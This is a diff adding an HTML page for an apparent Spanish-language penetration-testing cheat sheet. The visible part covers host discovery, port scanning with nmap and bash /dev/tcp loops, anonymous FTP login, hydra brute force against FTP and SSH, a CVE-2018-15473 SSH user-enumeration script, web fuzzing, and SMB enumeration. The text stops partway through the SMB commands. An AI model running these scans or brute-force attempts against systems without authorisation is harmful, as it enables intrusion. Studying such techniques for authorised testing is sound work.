@@ -1,0 +1,2668 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecuritiXplore</title>
+    <link rel="stylesheet" type="text/css" href="css/styles.css">
+    <link rel="stylesheet" type="text/css" href="css/securityxplorepagina.css">
+    <link rel="icon" href="img/favicon.ico" type="image/x-icon" />
+    <style>
+        h1.title {
+            margin-left: 20px;
+            /* Ajusta el valor según tus necesidades */
+        }
+
+        .content-item {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <header class="menu_security_1">
+        <h1 class="title">SecuritiXplore</h1>
+        <a class="menu_security" href="index.html">Inicio</a>
+    </header>
+
+    <section id="menu">
+        <ul>
+            <li><a href="#enumeration-exploitation">ENUMERATION & EXPLOITATION</a>
+                <ul class="submenu">
+                    <li><a href="#recognition">RECOGNITION</a></li>
+                    <li><a href="#network-services">NETWORK SERVICES</a></li>
+                </ul>
+            </li>
+            <li><a href="#web-vulnerabilities">WEB VULNERABILITIES</a>
+                <ul class="submenu">
+                    <li><a href="#command-injection">Command Injection</a></li>
+                    <li><a href="#csrf">CSRF (Cross Site Request Forgery)</a></li>
+                    <li><a href="#file-inclusion">File Inclusion</a></li>
+                    <li><a href="#file-upload">File Upload</a></li>
+                    <li><a href="#nosql-injection">NoSQL Injection</a></li>
+                    <li><a href="#path-traversal">Path Traversal</a></li>
+                    <li><a href="#sql-injection">SQL Injection</a></li>
+                    <li><a href="#ssrf">SSRF (Server Side Request Forgery)</a></li>
+                    <li><a href="#ssti">SSTI (Server Side Template Injection)</a></li>
+                    <li><a href="#xss">XSS (Cross Site Scripting)</a></li>
+                    <li><a href="#xxe">XXE (XML External Entity)</a></li>
+                </ul>
+            </li>
+            <li><a href="#active-directory">ACTIVE DIRECTORY</a>
+                <ul class="submenu">
+                    <li><a href="#active-directory">ACTIVE DIRECTORY</a></li>
+                </ul>
+            </li>
+            <li><a>|</a>
+            <li><a href="#post-exploitation">POST EXPLOITATION</a>
+                <ul class="submenu">
+                    <li><a href="#reverse-shell">REVERSE SHELL</a></li>
+                    <li><a href="#file-transfer">FILE TRANSFER</a></li>
+                </ul>
+            </li>
+            <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a>
+                <ul class="submenu">
+                    <li><a href="#linux-privilege-escalation">Linux Privilege Escalation</a></li>
+                    <li><a href="#windows-privilege-escalation">Windows Privilege Escalation</a></li>
+                </ul>
+            </li>
+            <li><a>|</a>
+            <li><a href="#scripts">SCRIPTS</a>
+                <ul class="submenu">
+                    <li><a href="#directorybrute">Directorybrute Herramienta</a></li>
+                    <li><a href="#cerbero">Cerbero Herramienta</a></li>
+                    <li><a href="#subruteforce">suBruteforce Herramienta</a></li>
+                    <li><a href="#sqlinjectionscripts">SQL Injection Scripts</a></li>
+                </ul>
+            </li>
+        </ul>
+    </section>
+
+    <section id="terminal">
+        <div class="terminal-message">
+            <p>Welcome to SecuritiXplore. Select an option from the menu above:</p>
+            <p>Available options: ENUMERATION & EXPLOITATION, WEB VULNERABILITIES, ACTIVE DIRECTORY, POST EXPLOITATION,
+                PRIVILEGE ESCALATION</p>
+            <p>Type "help" for assistance.</p>
+        </div>
+    </section>
+
+    <section id="content">
+        <div id="recognition" class="content-item">
+            <h2>$ RECOGNITION _</h2>
+            <br>
+            <p>En la fase de reconocimiento de las pruebas de penetración, el objetivo principal es recopilar datos
+                esenciales sobre los sistemas de la red objetivo mediante la construcción de un mapa de red detallado.
+                Este paso crucial sienta las bases para un mayor análisis y una posible explotación.</p>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">HOST DISCOVERY</h3>
+            <br>
+            <p>El paso inicial en el mapeo de la red implica identificar los hosts activos dentro de la red. Esto puede
+                ser realizando barridos de ping y escaneos ARP para enumerar los hosts.</p>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">ARP Scan</h3>
+            <br>
+            <div class="command-container">
+                <div class="command" style="font-weight: bold;">
+                    <span style="color: rgb(20, 115, 120);">arp-scan</span>
+                    <span style="color: rgb(180, 109, 68);">-I</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">interface</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">--localnet</span>
+                    <span style="color: rgb(180, 109, 68);">--ignoredups</span>
+                    <!-- <button id="copyButton" class="copy-button" onclick="copyCommand()">Copiar</button> -->
+                </div>
+                <br>
+                <h3 style="font-weight: bold; font-size: 150%;">NMAP PING SCAN</h3>
+                <br>
+                <div class="command" style="font-weight: bold;">
+                    <span style="color: rgb(20, 115, 120);">nmap</span>
+                    <span style="color: rgb(180, 109, 68);">-sn</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">network</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span><span style="color: rgb(180, 109, 68);">/</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">mask</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </div>
+                <br>
+                <h3 style="font-weight: bold; font-size: 150%;">BASH PING SWEEP</h3>
+                <br>
+                <div class="command" style="font-weight: bold;">
+                    <span style="color: rgb(20, 115, 120);">bash</span>
+                    <span style="color: rgb(180, 109, 68);">-c</span>
+                    <span style="color: rgb(179, 179, 179);">'</span>
+                    <span style="color: rgb(179, 179, 179);">n=</span>
+                    <span style="color: rgb(179, 179, 179)">&lt;network&gt;</span>
+                    <span style="color: rgb(179, 179, 179);"> ;</span>
+                    <span style="color: rgb(179, 179, 179);">for i in </span>
+                    <span style="color: rgb(179, 179, 179);">{1..254}</span>
+                    <span style="color: rgb(179, 179, 179);">; do \</span>
+                    <br>
+                    <span style="color: rgb(179, 179, 179);">(</span>
+                    <span style="color: rgb(179, 179, 179)">timeout 2</span>
+                    <span style="color: rgb(179, 179, 179);"> ping -c 1</span>
+                    <span style="color: rgb(179, 179, 179);"> $n.$i |</span>
+                    <span style="color: rgb(179, 179, 179);"> grep -E -o</span>
+                    <span style="color: rgb(179, 179, 179);"> "([0-9]{1,3}\.){3}[0-9]{1,3}:"</span>
+                    <span style="color: rgb(179, 179, 179);"> | \</span>
+                    <br>
+                    <span style="color: rgb(179, 179, 179);"> tr -d ":"</span>
+                    <span style="color: rgb(179, 179, 179);"> &); done; wait'</span>
+                </div>
+                <br>
+                <div class="command_into" style="font-weight: bold;">
+                    <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                    <span style="color: rgb(225, 225, 225);">Specify</span>
+                    <span style="color: rgb(225, 225, 225);">the</span>
+                    <div class="command_into_command" style="font-weight: bold;">
+                        <span style="color: rgb(225, 225, 225)">&lt;network&gt;</span>
+                    </div>
+                    <span style="color: rgb(225, 225, 225);">without</span>
+                    <span style="color: rgb(225, 225, 225);">the</span>
+                    <span style="color: rgb(225, 225, 225);">last</span>
+                    <span style="color: rgb(225, 225, 225);">octet</span>
+                    <div class="command_into_command" style="font-weight: bold;">
+                        <span style="color: rgb(225, 225, 225);">(e.g. 192.168.1)</span>
+                    </div>
+                </div>
+                <br>
+                <h3 style="font-weight: bold; font-size: 150%;">PORT SCAN</h3>
+                <br>
+                <p>Después de completar la enumeración de la red e identificar nuestros objetivos, el siguiente paso
+                    consiste en escanear los puertos abiertos en los hosts para descubrir vulnerabilidades y posibles
+                    vectores de ataque.</p>
+                <br>
+                <h3 style="font-weight: bold; font-size: 150%;">Nmap TCP Port Scan</h3>
+                <br>
+                <div class="command" style="font-weight: bold;">
+                    <span style="color: rgb(20, 115, 120);">nmap</span>
+                    <span style="color: rgb(180, 109, 68);">-p-</span>
+                    <span style="color: rgb(180, 109, 68);">--open</span>
+                    <span style="color: rgb(180, 109, 68);">-sS</span>
+                    <span style="color: rgb(180, 109, 68);">-n</span>
+                    <span style="color: rgb(180, 109, 68);">-v</span>
+                    <span style="color: rgb(180, 109, 68);">-Pn</span>
+                    <span style="color: rgb(180, 109, 68);">--min-rate</span>
+                    <span style="color: rgb(216, 162, 85);">5000</span>
+                    <span style="color: rgb(180, 109, 68);">-oN</span>
+                    <span style="color: rgb(180, 109, 68);">allPorts</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </div>
+                <br>
+                <h3 style="font-weight: bold; font-size: 150%;">Bash TCP Port Scan</h3>
+                <br>
+                <div class="command" style="font-weight: bold;">
+                    <span style="color: rgb(20, 115, 120);">bash</span>
+                    <span style="color: rgb(180, 109, 68);">-c</span>
+                    <span style="color: rgb(179, 179, 179);">'</span>
+                    <span style="color: rgb(179, 179, 179);">ip=</span><span
+                        style="color: rgb(179, 179, 179);">&lt;</span><span
+                        style="color: rgb(179, 179, 179);">target</span><span
+                        style="color: rgb(179, 179, 179);">&gt;</span><span style="color: rgb(179, 179, 179);">;</span>
+                    <span style="color: rgb(179, 179, 179);">for</span>
+                    <span style="color: rgb(179, 179, 179);">port</span>
+                    <span style="color: rgb(179, 179, 179);">in</span>
+                    <span style="color: rgb(179, 179, 179);">$(seq</span>
+                    <span style="color: rgb(179, 179, 179);">1</span>
+                    <span style="color: rgb(179, 179, 179);">65535</span><span
+                        style="color: rgb(179, 179, 179);">);</span>
+                    <span style="color: rgb(179, 179, 179);">do</span>
+                    <br>
+                    <span style="color: rgb(179, 179, 179);">(echo</span>
+                    <span style="color: rgb(179, 179, 179);">&gt;</span>
+                    <span style="color: rgb(179, 179, 179);">/dev/tcp/</span><span
+                        style="color: rgb(179, 179, 179);">$ip</span><span
+                        style="color: rgb(179, 179, 179);">/</span><span
+                        style="color: rgb(179, 179, 179);">$port</span><span style="color: rgb(179, 179, 179);">)</span>
+                    <span style="color: rgb(179, 179, 179);">&gt;</span>
+                    <span style="color: rgb(179, 179, 179);">/dev/null</span>
+                    <span style="color: rgb(179, 179, 179);">2&gt;&1</span>
+                    <span style="color: rgb(179, 179, 179);">&amp;&amp;</span>
+                    <br>
+                    <span style="color: rgb(179, 179, 179);">echo</span>
+                    <span style="color: rgb(179, 179, 179);">-e</span>
+                    <span style="color: rgb(179, 179, 179);">"$port\033[K"</span>
+                    <span style="color: rgb(179, 179, 179);">&amp;</span>
+                    <span style="color: rgb(179, 179, 179);">if</span>
+                    <span style="color: rgb(179, 179, 179);">[</span>
+                    <span style="color: rgb(179, 179, 179);">$((port</span>
+                    <span style="color: rgb(179, 179, 179);">% 200))</span>
+                    <span style="color: rgb(179, 179, 179);">-eq 0</span>
+                    <span style="color: rgb(179, 179, 179);">];</span>
+                    <br>
+                    <span style="color: rgb(179, 179, 179);">then</span>
+                    <span style="color: rgb(179, 179, 179);">wait;</span>
+                    <span style="color: rgb(179, 179, 179);">fi;</span>
+                    <span style="color: rgb(179, 179, 179);">echo</span>
+                    <span style="color: rgb(179, 179, 179);">-ne</span>
+                    <span style="color: rgb(179, 179, 179);">"$port/65535\r";</span>
+                    <span style="color: rgb(179, 179, 179);">done;</span>
+                    <span style="color: rgb(179, 179, 179);">wait'</span>
+                </div>
+                <br>
+                <h3 style="font-weight: bold; font-size: 150%;">Bash TCP Port Scan</h3>
+                <br>
+                <div class="command" style="font-weight: bold;">
+                    <span style="color: rgb(20, 115, 120);">nmap</span>
+                    <span style="color: rgb(180, 109, 68);">-sU</span>
+                    <span style="color: rgb(180, 109, 68);">-F</span>
+                    <span style="color: rgb(180, 109, 68);">-oN</span>
+                    <span style="color: rgb(180, 109, 68);">udpPorts</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </div>
+                <br>
+                <h3 style="font-weight: bold; font-size: 150%;">Service & Version Detection</h3>
+                <br>
+                <div class="command" style="font-weight: bold;">
+                    <span style="color: rgb(20, 115, 120);">nmap</span>
+                    <span style="color: rgb(180, 109, 68);">-p</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">port/s</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">-sCV</span>
+                    <span style="color: rgb(180, 109, 68);">-oN</span>
+                    <span style="color: rgb(180, 109, 68);">portScan</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </div>
+                <br>
+                <h3 style="font-weight: bold; font-size: 150%;">Nmap Scripts</h3>
+                <br>
+                <div class="command" style="font-weight: bold;">
+                    <span style="color: rgb(20, 115, 120);">nmap</span>
+                    <span style="color: rgb(180, 109, 68);">-p</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">port/s</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">--script</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">script</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </div>
+                <br>
+                <div class="command_into" style="font-weight: bold;">
+                    <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                    <span style="color: rgb(225, 225, 225);">You</span>
+                    <span style="color: rgb(225, 225, 225);">can</span>
+                    <span style="color: rgb(225, 225, 225);">list</span>
+                    <span style="color: rgb(225, 225, 225);">all</span>
+                    <span style="color: rgb(225, 225, 225);">available</span>
+                    <span style="color: rgb(225, 225, 225);">Nmap</span>
+                    <span style="color: rgb(225, 225, 225);">scripts</span>
+                    <span style="color: rgb(225, 225, 225);">using</span>
+                    <span style="color: rgb(225, 225, 225);">the</span>
+                    <span style="color: rgb(225, 225, 225);">following</span>
+                    <span style="color: rgb(225, 225, 225);">command:</span>
+                    <div class="command_into_command2" style="font-weight: bold; margin-top: 10px;">
+                        <p style="color: rgb(53, 81, 98);"># List nmap nse scripts</p>
+                        <p><span style="color: rgb(20, 115, 120);">ls</span> <span
+                                style="color: rgb(180, 109, 68);">/usr/share/nmap/scripts | grep</span> <span
+                                style="color: rgb(167, 82, 33)">&lt;</span><span
+                                style="color: rgb(180, 109, 68);">service</span><span
+                                style="color: rgb(167, 82, 33)">&gt;</span>
+                        </p>
+                        <p style="color: rgb(53, 81, 98);"># Get info about a script</p>
+                        <p><span style="color: rgb(20, 115, 120);">nmap</span> <span
+                                style="color: rgb(180, 109, 68);">--script-help</span> <span
+                                style="color: rgb(167, 82, 33)">&lt;</span><span
+                                style="color: rgb(180, 109, 68);">script</span><span
+                                style="color: rgb(167, 82, 33)">&gt;</span>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="network-services" class="content-item">
+            <h2>$ NETWORK SERVICES _</h2>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Enumeration</h3>
+            <br>
+            <span>Detección de versión de servicio y valor predeterminado</span>
+            <span class="nmap-box" style="font-weight: bold;">nmap</span>
+            <span>scripts</span>
+            <br><br>
+            <h3 style="font-weight: bold; font-size: 150%;">Services</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">FTP</h3>
+            <br>
+            <p>Anonymous Login</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">ftp <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span></span>
+                <p style="color: rgb(231, 231, 231);"><span style="color: rgb(167, 82, 33)">&gt;</span>Name: <span
+                        class="value">anonymous</span></p>
+                <p style="color: rgb(231, 231, 231);"><span style="color: rgb(167, 82, 33)">&gt;</span>Password: <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(231, 231, 231);">target</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+            </div>
+            <br>
+            <p>Brute Force</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">hydra</span>
+                <span style="color: rgb(180, 109, 68);">-L</span> <span
+                    style="color: rgb(180, 109, 68);">usernames.txt</span>
+                <span style="color: rgb(180, 109, 68);">-P</span> <span
+                    style="color: rgb(180, 109, 68);">passwords.txt</span>
+                <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                    style="color: rgb(180, 109, 68)">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                <span style="color: rgb(180, 109, 68);">ftp</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SSH</h3>
+            <br>
+            <p>Cualquier versión de OpenSSH anterior a la 7.7 es vulnerable a la enumeración de usuarios
+                (CVE-2018-15473) si no está parcheado. Para explotar esta vulnerabilidad, podemos utilizar el siguiente
+                script:</p>
+            <br>
+            <div class="box">
+                <h3>SSH User Enumeration</h3>
+                <p>Este script en Python permite enumerar usuarios SSH.</p>
+                <a href="https://github.com/villalbanico9/H4Ts/blob/main/Tools/Fuzzing%20%26%20Brute%20Force/SSH%20User%20Enumeration/ssh_user_enum.py"
+                    target="_blank">Ver en GitHub</a>
+            </div>
+            <br>
+            <p style="color: rgb(69, 69, 69); font-weight: bold;">ssh_user_enum.py</p>
+            <br>
+            <p>Brute Force</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">hydra</span>
+                <span style="color: rgb(180, 109, 68);">-L</span> <span
+                    style="color: rgb(180, 109, 68);">usernames.txt</span>
+                <span style="color: rgb(180, 109, 68);">-P</span> <span
+                    style="color: rgb(180, 109, 68);">passwords.txt</span>
+                <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                    style="color: rgb(180, 109, 68)">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                <span style="color: rgb(180, 109, 68);">ssh</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">HTTP/HTTPS</h3>
+            <br>
+            <p>Enumere archivos y directorios básicos con scripts nmap</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">nmap</span>
+                <span style="color: rgb(180, 109, 68);">-p80,443</span> <span
+                    style="color: rgb(180, 109, 68);">--script</span>
+                <span style="color: rgb(180, 109, 68);">http-enum</span> <span
+                    style="color: rgb(180, 109, 68);">-oN</span>
+                <span style="color: rgb(180, 109, 68);">webScan</span>
+                <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                    style="color: rgb(180, 109, 68)">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <p style="font-weight: bold;">Web Technologies</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(229, 229, 229);">whatweb</span>
+                <span style="color: rgb(229, 229, 229);">&lt;</span><span
+                    style=" color: rgb(229, 229, 229);">target</span><span
+                    style="color: rgb(229, 229, 229);">&gt;</span>
+            </div>
+            <br>
+            <span>También recomiendo usar el </span>
+            <a href="https://www.wappalyzer.com/apps/" target="_blank" class="nmap-box"
+                style="font-weight: bold; text-decoration: none;">Wappalizer</a>
+            <span> extensión del navegador.</span>
+            <br><br>
+            <p style="font-weight: bold;">File and Directory Enumeration</p>
+            <br>
+            <span>• </span><strong>Gobuster</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">gobuster</span>
+                <span style="color: rgb(180, 109, 68);">dir</span> <span style="color: rgb(180, 109, 68);">-u</span>
+                <span style="color: rgb(180, 109, 68);">http://</span><span
+                    style="color: rgb(167, 82, 33)">&lt;</span><span style="color: rgb(180, 109, 68)">target</span><span
+                    style="color: rgb(167, 82, 33)">&gt;</span><span style="color: rgb(180, 109, 68);">/</span>
+                <span style="color: rgb(180, 109, 68);">-w</span>
+                <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                    style="color: rgb(180, 109, 68)">wordlist</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <div class="command_into" style="font-weight: bold;">
+                <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                <span style="color: rgb(225, 225, 225); display: block; margin-top: 10px;">Parámetros útiles:</span>
+                <div style="margin-top: 10px;">
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">-t, --threads
+                            <span class="nmap-box-into" style="margin-left: 20px;">Concurrent threads</span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">--exclude-length
+                            <span class="nmap-box-into" style="margin-left: 20px;">Exclude content length</span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">-s, --status-codes
+                            <span class="nmap-box-into" style="margin-left: 20px;">White list status codes</span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">-b,
+                            --status-codes-blacklist
+                            <span class="nmap-box-into" style="margin-left: 20px;">Black list status codes</span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">-r,
+                            --follow-redirect
+                            <span class="nmap-box-into" style="margin-left: 20px;">Follow redirects</span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">--proxy
+                            <span class="nmap-box-into" style="margin-left: 20px;">Use Proxy
+                                <span>&lt;</span><span>type:host:port</span><span>&gt;</span>
+                            </span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">-k,
+                            --no-tls-validation
+                            <span class="nmap-box-into" style="margin-left: 20px;">Skip TLS verification</span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">--timeout
+                            <span class="nmap-box-into" style="margin-left: 20px;">HTTP Timeout</span></span>
+                    </p>
+                </div>
+            </div>
+            <br>
+            <span>• </span><strong>Wfuzz</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">wfuzz</span>
+                <span style="color: rgb(180, 109, 68);">-w</span>
+                <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                    style="color: rgb(180, 109, 68)">wordlist</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                <span style="color: rgb(180, 109, 68);">http://</span><span
+                    style="color: rgb(167, 82, 33)">&lt;</span><span style="color: rgb(180, 109, 68)">target</span><span
+                    style="color: rgb(167, 82, 33)">&gt;</span><span style="color: rgb(180, 109, 68);">/</span><span
+                    style="color: rgb(180, 109, 68);">FUZZ</span>
+            </div>
+            <br>
+            <div class="command_into" style="font-weight: bold;">
+                <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                <span style="color: rgb(225, 225, 225); display: block; margin-top: 10px;">Parámetros útiles:</span>
+                <div style="margin-top: 10px;">
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">-t
+                            <span>&lt;</span><span>threads</span><span>&gt;</span>
+                            <span class="nmap-box-into" style="margin-left: 20px;">Concurrent threads</span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">-L, --follow
+                            <span class="nmap-box-into" style="margin-left: 20px;">Follow redirects</span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">-p
+                            <span class="nmap-box-into" style="margin-left: 20px;">Use Proxy
+                                <span>&lt;</span><span>host:port:type</span><span>&gt;</span></span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">--hc/hl/hw/hh
+                            <span class="nmap-box-into" style="margin-left: 20px;">Hide
+                                code/lines/words/chars</span></span>
+                    </p>
+                    <br>
+                    <p><span class="nmap-box-into" style="color: rgb(225, 225, 225); display: block;">--sc/sl/sw/sh
+                            <span class="nmap-box-into" style="margin-left: 20px;">Show
+                                code/lines/words/chars</span></span>
+                    </p>
+                </div>
+            </div>
+            <br>
+            <p style="font-weight: bold;">Subdomain Enumeration</p>
+            <br>
+            <span>• </span><strong>Gobuster</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(216, 216, 216);">gobuster</span>
+                <span style="color: rgb(216, 216, 216);">vhost</span>
+                <span style="color: rgb(216, 216, 216);">-u</span>
+                <span style="color: rgb(216, 216, 216);">http://</span><span
+                    style="color: rgb(216, 216, 216);">&lt;</span><span
+                    style="color: rgb(216, 216, 216);">target</span><span
+                    style="color: rgb(216, 216, 216);">&gt;</span><span style="color: rgb(216, 216, 216);">/</span>
+                <span style="color: rgb(216, 216, 216);">-w</span>
+                <span style="color: rgb(216, 216, 216);">&lt;</span><span
+                    style="color: rgb(216, 216, 216);">wordlist</span><span
+                    style="color: rgb(216, 216, 216);">&gt;</span>
+            </div>
+            <br>
+            <span>• </span><strong>Wfuzz</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(216, 216, 216);">wfuzz</span>
+                <span style="color: rgb(216, 216, 216);">-H</span>
+                <span style="color: rgb(216, 216, 216);">'Host: FUZZ.<span
+                        style="color: rgb(216, 216, 216);">&lt;</span><span
+                        style="color: rgb(216, 216, 216);">target</span><span
+                        style="color: rgb(216, 216, 216);">&gt;</span>'</span>
+                <span style="color: rgb(216, 216, 216);">-w</span> <span
+                    style="color: rgb(216, 216, 216);">&lt;</span><span
+                    style="color: rgb(216, 216, 216);">wordlist</span><span
+                    style="color: rgb(216, 216, 216);">&gt;</span>
+                <span style="color: rgb(216, 216, 216);">http://</span><span
+                    style="color: rgb(216, 216, 216);">&lt;</span><span
+                    style="color: rgb(216, 216, 216);">target</span><span
+                    style="color: rgb(216, 216, 216);">&gt;</span><span style="color: rgb(216, 216, 216);">/</span>
+            </div>
+            <br>
+            <p style="font-weight: bold;">Exploitation</p>
+            <br>
+            <p>Una vez enumerada la web, es posible que desees explotar algunas vulnerabilidades web:</p>
+            <br>
+            <p style="font-weight: bold;">Para ello entrar en el apartado 'WEB VULNERABILITIES'</p>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SMB</h3>
+            <br>
+            <p>Enumeración del sistema con <span class="nmap-box" style="font-weight: bold;">enum4linux</span></p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">enum4linux</span>
+                <span style="color: rgb(180, 109, 68);">-a</span>
+                <span style="color: rgb(180, 109, 68);">[-u</span> <span style="color: rgb(224, 224, 224);">'<span
+                        style="color: rgb(224, 224, 224)">&lt;</span><span
+                        style="color: rgb(224, 224, 224)">username</span><span
+                        style="color: rgb(224, 224, 224)">&gt;</span>'</span> <span
+                    style="color: rgb(180, 109, 68);">-p</span> <span style="color: rgb(224, 224, 224);">'<span
+                        style="color: rgb(224, 224, 224)">&lt;</span><span
+                        style="color: rgb(224, 224, 224)">password</span><span
+                        style="color: rgb(224, 224, 224)">&gt;</span>'<span
+                        style="color: rgb(180, 109, 68);">]</span></span>
+                <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                    style="color: rgb(180, 109, 68)">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <p style="font-weight: bold;">Shares Enumeration</p>
+            <br>
+            <div class="command_into" style="font-weight: bold;">
+                <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                <span style="color: rgb(225, 225, 225); display: block; margin-top: 10px;">En sistemas Windows, es
+                    posible que necesites evitar reacciones violentas:</span>
+                <div style="margin-top: 10px;">
+                    <p><span class="nmap-box-into"
+                            style="color: rgb(225, 225, 225); display: block;">\\\\<span>&lt;</span><span>target</span><span>&gt;</span><span>\\</span><span>&lt;</span><span>share</span><span>&gt;</span></span>
+                    </p>
+                </div>
+            </div>
+            <br>
+            <div class="command_into_command3" style="font-weight: bold; margin-top: 10px;">
+                <p style="color: rgb(53, 81, 98);"># null session</p>
+                <p><span style="color: rgb(20, 115, 120);">smbclient</span> <span style="color: rgb(180, 109, 68);">-N
+                        -L</span> <span style="color: rgb(180, 109, 68);">//</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+                <p style="color: rgb(53, 81, 98);"># authenticated</p>
+                <p><span style="color: rgb(20, 115, 120);">smbclient</span> <span
+                        style="color: rgb(180, 109, 68);">-U</span> <span
+                        style="color: rgb(165, 165, 165);">'username[%password]'</span> <span
+                        style="color: rgb(180, 109, 68);">-L</span> <span
+                        style="color: rgb(180, 109, 68);">//</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+                <p style="color: rgb(53, 81, 98);"># conect to a share</p>
+                <p><span style="color: rgb(20, 115, 120);">smbclient</span> <span
+                        style="color: rgb(165, 165, 165);">[-U</span> <span
+                        style="color: rgb(165, 165, 165);">'username[%password]'<span
+                            style="color: rgb(180, 109, 68);">]</span></span> <span
+                        style="color: rgb(180, 109, 68);">//</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span><span style="color: rgb(180, 109, 68);">/</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
